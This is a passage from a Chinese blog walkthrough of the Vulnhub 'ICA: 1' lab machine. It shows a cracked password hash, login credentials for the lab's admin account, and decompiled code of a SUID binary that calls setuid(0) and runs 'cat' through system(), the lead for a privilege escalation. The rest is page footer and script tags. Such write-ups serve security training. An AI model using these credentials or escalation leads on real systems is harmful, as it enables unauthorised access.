+<p>得 <code>$P$E0LB.ps5CD9nBJkGz2k0k6ER9NjbE90</code></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404181356503.png" /></p>
+<p>登录 <code>admin@localhost.com/123456</code></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404181428732.png" /></p>
+<p>测试历史漏洞都未成功……</p>
+<h3 id="get_access-源码">3.2. get_access 源码</h3>
+<p>ida 对 get_access 反汇编</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404181207492.png" /></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setuid(<span class="number">0</span>);    <span class="comment">// 提权</span></span><br><span class="line">  setgid(<span class="number">0</span>);    <span class="comment">//  提权</span></span><br><span class="line">  system(<span class="string">&quot;cat /root/system.info&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( socket(<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>) == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Could not create socket to access to the system.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;All services are disabled. Accessing to the system is allowed only within working hours.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Ghost
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://z9m8r8.github.io/2024/04/18/ICA%201/" title="ICA: 1">https://z9m8r8.github.io/2024/04/18/ICA 1/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Vulnhub-%E9%9D%B6%E5%9C%BA/" rel="tag"><i class="fa fa-tag"></i> Vulnhub 靶场</a>
+              <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag"><i class="fa fa-tag"></i> 信息收集</a>
+              <a href="/tags/shell/" rel="tag"><i class="fa fa-tag"></i> shell</a>
+              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> 提权</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/04/17/Thales%201/" rel="prev" title="Thales: 1">
+                  <i class="fa fa-angle-left"></i> Thales: 1
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2024/04/18/Noob%201/" rel="next" title="Noob: 1">
+                  Noob: 1 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2020 – 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Ghost</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">202k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">12:13</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/z9m8r8" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.umd.js" integrity="sha256-ytMJGN3toR+a84u7g7NuHm91VIR06Q41kMWDr2pq7Zo=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
+  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://z9m8r8.github.io/2024/04/18/ICA%201/"}</script>
+  <script src="/js/third-party/quicklink.js"></script>
+
+</body>
+</html>
